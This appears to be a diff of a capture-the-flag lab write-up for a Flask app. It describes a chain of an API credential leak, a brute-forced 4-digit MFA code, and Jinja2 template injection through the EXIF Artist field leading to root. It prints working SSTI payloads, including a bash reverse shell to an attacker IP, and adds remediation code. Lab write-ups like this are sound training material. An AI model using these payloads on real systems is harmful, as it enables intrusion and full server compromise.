@@ -1,123 +1,227 @@
 ---
 layout: default
-title: "Verbose (SSTI) - Hacksmarter"
+title: "Verbose (SSTI to RCE) - Hacksmarter"
 ---
+
 [← Back](./)
 
-# Verbose (SSTI) - HackSmarter
+# HackSmarter - Verbose Lab Writeup
 
-## Overview
-- **Platform:** HackSmarter
-- **Vulnerabilities:** Information Disclosure, Weak MFA, SSTI
-- **Framework:** Flask/Jinja2
-- **Result:** Root shell (server running as root - poor configuration)
-- **Flag:** `/root/root.txt`
+<div class="meta">
+  <span><strong>Date:</strong> 2026-01-24</span>
+  <span><strong>Difficulty:</strong> Medium</span>
+  <span><strong>Platform:</strong> HackSmarter</span>
+</div>
 
 ---
 
-## Attack Chain
+## Executive Summary
 
-### 1. User Registration
-Created a normal user account on the application.
+**Overall Risk Rating:** 🔴 Critical
 
-### 2. Information Disclosure - API Leaks Credentials
-Discovered `/api/users/all` endpoint that exposed all user data including passwords:
+**Key Findings:**
+- 1 Critical information disclosure vulnerability (API leaking credentials)
+- 1 High-risk weak MFA implementation (brute-forceable 4-digit codes)
+- 1 Critical SSTI vulnerability via EXIF metadata rendering
+- Server running as root (immediate privilege escalation)
+
+**Business Impact:** Chained exploitation of information disclosure, weak MFA, and SSTI allows attackers to gain root-level remote code execution on the server, leading to complete system compromise and data breach.
+
+---
+
+## Objective
+
+Gain access to the root flag located at `/root/root.txt`.
+
+## Initial Access
+
+```bash
+# Target Application
+URL: http://[target]:5000 (Flask application)
+
+# Initial Action
+Created a standard user account via registration
+```
+
+## Key Findings
+
+### Critical & High-Risk Vulnerabilities
+
+1. **Information Disclosure** - `/api/users/all` exposes all user credentials (CWE-200)
+2. **Weak MFA Implementation** - 4-digit codes brute-forceable (CWE-307)
+3. **Server-Side Template Injection** - EXIF metadata rendered via Jinja2 (CWE-1336)
+4. **Insecure Server Configuration** - Application running as root (CWE-250)
+
+**CVSS v3.1 Score for SSTI Chain:** **9.8 (Critical)**
+
+| Metric | Value |
+|--------|-------|
+| Attack Vector | Network (AV:N) |
+| Attack Complexity | Low (AC:L) |
+| Privileges Required | Low (PR:L) |
+| User Interaction | None (UI:N) |
+| Scope | Unchanged (S:U) |
+| Confidentiality | High (C:H) |
+| Integrity | High (I:H) |
+| Availability | High (A:H) |
+
+## Enumeration Summary
+
+### Application Analysis
+
+**Target Endpoints Discovered:**
+- `/api/users/all` - Returns all user data including plaintext passwords
+- `/admin/login` - Admin login with MFA protection
+- `/admin/logo_preview?file=` - Logo preview with EXIF metadata display
+- `/admin/upload` - Logo upload functionality (PNG only)
+- `/admin/users` - User permission management
+
+**Summary:**
+- **Framework:** Flask/Werkzeug with Jinja2 templating
+- **Authentication:** Session-based with MFA for admin
+- **File Upload:** PNG images only, EXIF metadata extracted and displayed
+- **Authorization:** Role-based (user/admin)
+
+## Attack Chain Visualization
+
+```
+┌─────────────────────┐     ┌──────────────────┐     ┌─────────────────────┐
+│   User Registration │────▶│   API Info       │────▶│   Admin Creds       │
+│   (Standard User)   │     │   Disclosure     │     │   Obtained          │
+│                     │     │   /api/users/all │     │                     │
+└─────────────────────┘     └──────────────────┘     └─────────────────────┘
+                                                                │
+                                                                ▼
+┌─────────────────────┐     ┌──────────────────┐     ┌─────────────────────┐
+│   Root Shell via    │◀────│   SSTI via EXIF  │◀────│   MFA Brute Force   │
+│   Reverse Shell     │     │   Artist Field   │     │   (0001-9999)       │
+│   (Server runs      │     │   in logo_preview│     │   5 threads +       │
+│    as root!)        │     │                  │     │   random delay      │
+└─────────────────────┘     └──────────────────┘     └─────────────────────┘
+                │
+                ▼
+      ┌─────────────────────┐
+      │   cat /root/root.txt│
+      │   FLAG CAPTURED     │
+      └─────────────────────┘
+```
+
+**Attack Path Summary:**
+1. **User Registration:** Create standard user account
+2. **Information Disclosure:** Query `/api/users/all` to obtain admin credentials
+3. **MFA Bypass:** Brute force 4-digit MFA code using Burp Intruder
+4. **Admin Access:** Gain access to admin panel with logo upload and user management
+5. **SSTI Discovery:** Identify EXIF metadata rendering in logo preview
+6. **RCE:** Inject Jinja2 payload into EXIF Artist field for reverse shell
+7. **Root Access:** Server running as root provides immediate root shell
+
+---
+
+## Exploitation Path
+
+### Step 1: Information Disclosure - API Credential Leak
+
+**Discovered `/api/users/all` endpoint exposing all user data:**
 
 ```http
 GET /api/users/all HTTP/1.1
-HTTP/1.1 200 OK
-Server: Werkzeug/3.1.5 Python/3.12.3
-Date: Fri, 23 Jan 2026 23:57:55 GMT
-Content-Type: application/json
-Content-Length: 572
-Connection: close
+Host: [target]
+```
 
+**Response:**
+
+```json
 [
-{"email":"tony@hacksmarter.local","id":1,"mfa":null,"password":"basketball","role":"user","username":"tony"},
-{"email":"johnny@hacksmarter.local","id":2,"mfa":null,"password":"dolphin","role":"user","username":"johnny"},
-	{
-		"email":"admin@hacksmarter.local",
-		"id":3,
-		"mfa":null,
-		"password":"YouWontGetThisPasswordYouNoobLOL123",
-		"role":"admin",
-		"username":"admin"
-	},
-{"email":"student@hacksmarter.local","id":4,"mfa":null,"password":"liverpool","role":"user","username":"student"},
-{"email":"test2@test.com","id":5,"mfa":null,"password":"password","role":"user","username":"haxor"}
+  {"email":"tony@hacksmarter.local","id":1,"mfa":null,"password":"basketball","role":"user","username":"tony"},
+  {"email":"johnny@hacksmarter.local","id":2,"mfa":null,"password":"dolphin","role":"user","username":"johnny"},
+  {
+    "email":"admin@hacksmarter.local",
+    "id":3,
+    "mfa":null,
+    "password":"YouWontGetThisPasswordYouNoobLOL123",
+    "role":"admin",
+    "username":"admin"
+  },
+  {"email":"student@hacksmarter.local","id":4,"mfa":null,"password":"liverpool","role":"user","username":"student"}
 ]
 ```
 
-Response revealed admin credentials among other users.
+**Analysis:** API endpoint returns plaintext passwords for all users including admin. No authentication required.
 
-### 3. MFA Bypass via Brute Force
-Attempted to login with admin credentials but account was protected by MFA (4-digit code).
+### Step 2: MFA Brute Force
 
-**Approach:**
-- Sent sample code `1234` to capture the request
-- Moved to Burp Intruder to brute force all combinations `0001-9999`
-- **Throttling required:** Server returned 500 errors under load
-- **Solution:** 5 concurrent threads with random millisecond delay to vary traffic pattern
-- Successfully brute forced the MFA code
+Attempted admin login but account protected by MFA (4-digit code).
 
-### 4. Admin Panel Access
-Once authenticated as admin, discovered two key functionalities:
-1. **Logo Upload** - Upload new site logo (PNG only)
-2. **User Permissions** - Upgrade any user's permissions
+**Burp Intruder Configuration:**
 
-Gave original user account admin permissions as well.
+```
+POST /admin/verify-mfa HTTP/1.1
+Host: [target]
+Content-Type: application/x-www-form-urlencoded
 
-### 5. SSTI Discovery
-Found logo preview endpoint:
+code=§0001§
+```
+
+- **Payload:** Numbers 0001-9999
+- **Issue:** Server returned 500 errors under heavy load
+- **Solution:** Reduced to 5 concurrent threads with random millisecond delay
+
+**Result:** Successfully brute forced MFA code and gained admin access.
+
+### Step 3: Admin Panel Enumeration
+
+**Admin capabilities discovered:**
+1. **Logo Upload** - Upload new site logo (PNG files only)
+2. **User Permissions** - Upgrade any user's role to admin
+
+**Logo Preview Endpoint:**
+
 ```
 /admin/logo_preview?file=logo.png
 ```
 
-The preview page displayed EXIF metadata - specifically the **Copyright / Artist** field.
+The preview page displays:
+- Image preview
+- **EXIF Metadata** - specifically the "Copyright / Artist" field
+
+### Step 4: SSTI Discovery via EXIF Metadata
+
+**Hypothesis:** EXIF metadata is extracted and rendered through Jinja2 template without sanitization.
 
 **SSTI Test:**
+
 ```bash
 convert -size 1x1 xc:white /tmp/test.png
 exiftool -Artist='{{7*7}}' /tmp/test.png
 ```
 
-Uploaded and previewed - **"49" appeared** in the Artist field, confirming Jinja2 SSTI.
+**Result:** Uploaded image, accessed preview - **"49" appeared** in the Artist field.
 
-### 6. RCE via Jinja2 SSTI Payload
-**Listener setup:**
+✅ **SSTI Confirmed** - Jinja2 template injection via EXIF Artist field.
+
+### Step 5: RCE via Jinja2 lipsum Payload
+
+**Listener Setup:**
+
 ```bash
-# Start listener
 nc -lvnp 4444
 ```
 
-**Payload creation:**
+**Payload Creation:**
+
 ```bash
 convert -size 1x1 xc:white /tmp/shell.png
-exiftool -Artist='{{lipsum.__globals__.os.popen("bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\"").read()}}' /tmp/shell.png
+exiftool -Artist='{{lipsum.__globals__.os.popen("bash -c \"bash -i >& /dev/tcp/10.200.31.196/4444 0>&1\"").read()}}' /tmp/shell.png
 ```
 
-Uploaded, triggered preview, received root shell.
-
-### 7. Flag Capture
-```bash
-cat /root/root.txt
-```
-
----
-
-## Payload Breakdown
-
-The SSTI payload:
-```
-{{lipsum.__globals__.os.popen("COMMAND").read()}}
-```
+**Payload Breakdown:**
 
 | Component | Purpose |
 |-----------|---------|
-| `{{ }}` | Jinja2 expression tags - evaluates and outputs result |
+| `{{ }}` | Jinja2 expression tags |
 | `lipsum` | Built-in Jinja2 function (lorem ipsum generator) |
-| `.__globals__` | Access Python's global namespace from function object |
-| `.os` | The `os` module available in globals |
+| `.__globals__` | Access Python's global namespace |
+| `.os` | Access the `os` module |
 | `.popen("cmd")` | Execute shell command |
 | `.read()` | Trigger execution and return output |
 
@@ -126,35 +230,42 @@ The SSTI payload:
 - Often not filtered (unlike `config`, `request`, `self`)
 - Provides access to imported modules like `os`
 
----
+**Execution:**
+1. Uploaded `shell.png` with SSTI payload
+2. Triggered `/admin/logo_preview?file=shell.png`
+3. Received root shell on netcat listener
 
-## Alternative Payloads
+### Step 6: Flag Capture
 
 ```bash
-# Using cycler
-exiftool -Artist='{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen("id").read()}}' /tmp/shell.png
+id
+# uid=0(root) gid=0(root) groups=0(root)
 
-# Using joiner
-exiftool -Artist='{{self._TemplateReference__context.joiner.__init__.__globals__.os.popen("id").read()}}' /tmp/shell.png
+cat /root/root.txt
+# FLAG{...}
 ```
 
----
-
-## Key Takeaways
-
-1. **Always check API endpoints** - `/api/users/all` exposed sensitive data including passwords
-2. **Weak MFA is no MFA** - 4-digit codes are brute-forceable in reasonable time
-3. **Throttle your attacks** - Adjust threads/delays to avoid crashing the target or triggering rate limits
-4. **EXIF metadata in templates = potential SSTI** - When file uploads display metadata, test all fields for injection
-5. **Test the correct field** - Comment field didn't work; Artist/Copyright was the injection point
-6. **Poor server config** - Application running as root gave immediate root access (no privesc needed)
+> **⚠️ Note:** Server was running as root - no privilege escalation required. This is a critical misconfiguration.
 
 ---
 
-## Resources
+## Flag / Objective Achieved
 
-- **PayloadsAllTheThings - SSTI:** https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
-- **HackTricks - SSTI:** https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/
+✅ **Objective:** Gained root shell via SSTI in EXIF metadata rendering
+
+✅ **Flag:** Retrieved from `/root/root.txt`
+
+---
+
+## Key Learnings
+
+- **API security:** Always authenticate and authorize API endpoints - `/api/users/all` should never expose credentials
+- **MFA implementation:** 4-digit codes are brute-forceable in reasonable time; use rate limiting and account lockout
+- **Throttle your attacks:** Adjust threads/delays to avoid crashing the target or triggering rate limits
+- **EXIF metadata in templates:** When file uploads display metadata, test all fields for injection
+- **Test the correct field:** Comment field didn't work; Artist/Copyright was the injection point
+- **lipsum SSTI bypass:** When `config`, `request`, `self` are filtered, use alternative objects like `lipsum`
+- **Run as least privilege:** Never run web applications as root
 
 ---
 
@@ -164,3 +275,185 @@ exiftool -Artist='{{self._TemplateReference__context.joiner.__init__.__globals__
 - **exiftool** - EXIF metadata manipulation
 - **convert** (ImageMagick) - Create minimal PNG files
 - **nc** (netcat) - Reverse shell listener
+
+---
+
+## Remediation
+
+### 1. Information Disclosure in /api/users/all (CVSS: 9.1 - Critical)
+
+**Issue:** API endpoint returns all user data including plaintext passwords without authentication.
+
+**CWE Reference:** CWE-200 - Exposure of Sensitive Information to an Unauthorized Actor
+
+**Fix:**
+
+```python
+# BEFORE (Vulnerable)
+@app.route('/api/users/all')
+def get_users():
+    users = User.query.all()
+    return jsonify([u.to_dict() for u in users])  # Includes passwords!
+
+# AFTER (Secure)
+@app.route('/api/users/all')
+@login_required
+@admin_required
+def get_users():
+    users = User.query.all()
+    return jsonify([{
+        'id': u.id,
+        'username': u.username,
+        'email': u.email,
+        'role': u.role
+        # Password explicitly excluded
+    } for u in users])
+```
+
+### 2. Weak MFA Implementation (CVSS: 7.5 - High)
+
+**Issue:** 4-digit MFA codes can be brute forced in under 10,000 attempts with no rate limiting.
+
+**CWE Reference:** CWE-307 - Improper Restriction of Excessive Authentication Attempts
+
+**Fix:**
+
+```python
+# Add rate limiting and account lockout
+from flask_limiter import Limiter
+
+limiter = Limiter(app, key_func=get_remote_address)
+
+@app.route('/admin/verify-mfa', methods=['POST'])
+@limiter.limit("5 per minute")  # Rate limit
+def verify_mfa():
+    # Check for account lockout
+    if get_failed_attempts(session['user_id']) >= 5:
+        return jsonify({'error': 'Account locked. Try again in 15 minutes.'}), 429
+
+    # Use 6+ digit codes or TOTP
+    # Implement exponential backoff
+```
+
+### 3. SSTI via EXIF Metadata (CVSS: 9.8 - Critical)
+
+**Issue:** EXIF metadata from uploaded images is rendered through Jinja2 without sanitization.
+
+**CWE Reference:** CWE-1336 - Improper Neutralization of Special Elements Used in a Template Engine
+
+**Fix:**
+
+```python
+# BEFORE (Vulnerable)
+@app.route('/admin/logo_preview')
+def logo_preview():
+    filename = request.args.get('file')
+    metadata = extract_exif(filename)
+    # Directly rendering user-controlled EXIF data in template!
+    return render_template('preview.html', artist=metadata.get('Artist', 'Unknown'))
+
+# AFTER (Secure)
+from markupsafe import escape
+
+@app.route('/admin/logo_preview')
+def logo_preview():
+    filename = request.args.get('file')
+    metadata = extract_exif(filename)
+    # Escape all user-controlled data before rendering
+    safe_artist = escape(metadata.get('Artist', 'Unknown'))
+    return render_template('preview.html', artist=safe_artist)
+```
+
+**Or strip EXIF data entirely:**
+
+```python
+from PIL import Image
+
+def strip_exif(image_path):
+    img = Image.open(image_path)
+    data = list(img.getdata())
+    img_no_exif = Image.new(img.mode, img.size)
+    img_no_exif.putdata(data)
+    img_no_exif.save(image_path)
+```
+
+### 4. Application Running as Root (CVSS: 7.8 - High)
+
+**Issue:** Web application runs as root user, providing immediate root access upon RCE.
+
+**CWE Reference:** CWE-250 - Execution with Unnecessary Privileges
+
+**Fix:**
+
+```bash
+# Create dedicated service user
+useradd -r -s /bin/false webapp
+
+# Run application as non-root
+sudo -u webapp python app.py
+
+# Or use systemd with User= directive
+[Service]
+User=webapp
+Group=webapp
+```
+
+---
+
+## Failed Attempts
+
+### Approach 1: Path Traversal in logo_preview
+
+```
+/admin/logo_preview?file=../../../etc/passwd
+```
+
+**Result:** ❌ Failed - Application strips path and only looks for filename in uploads directory
+
+**Response:**
+```
+Error: File 'passwd' not found.
+```
+
+### Approach 2: SSTI via EXIF Comment Field
+
+```bash
+exiftool -Comment='{{7*7}}' /tmp/test.png
+```
+
+**Result:** ❌ Failed - Comment field not rendered in template, only Artist/Copyright displayed
+
+### Approach 3: Direct SSTI in Filename
+
+```bash
+mv test.png '{{7*7}}.png'
+```
+
+**Result:** ❌ Failed - Filename sanitized on upload
+
+---
+
+## OWASP Top 10 Coverage
+
+- **A01:2021** - Broken Access Control (unauthenticated API access, MFA bypass)
+- **A02:2021** - Cryptographic Failures (plaintext password storage)
+- **A03:2021** - Injection (Server-Side Template Injection)
+- **A04:2021** - Insecure Design (EXIF metadata rendering without sanitization)
+- **A05:2021** - Security Misconfiguration (application running as root)
+- **A07:2021** - Identification and Authentication Failures (weak MFA)
+
+---
+
+## References
+
+**SSTI Resources:**
+- [PayloadsAllTheThings - SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
+- [HackTricks - SSTI](https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/)
+- [PortSwigger - Server-Side Template Injection](https://portswigger.net/web-security/server-side-template-injection)
+
+**EXIF Exploitation:**
+- [OWASP - Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
+
+---
+
+**Tags:** `#ssti` `#jinja2` `#exif` `#file-upload` `#mfa-bypass` `#information-disclosure` `#hacksmarter`
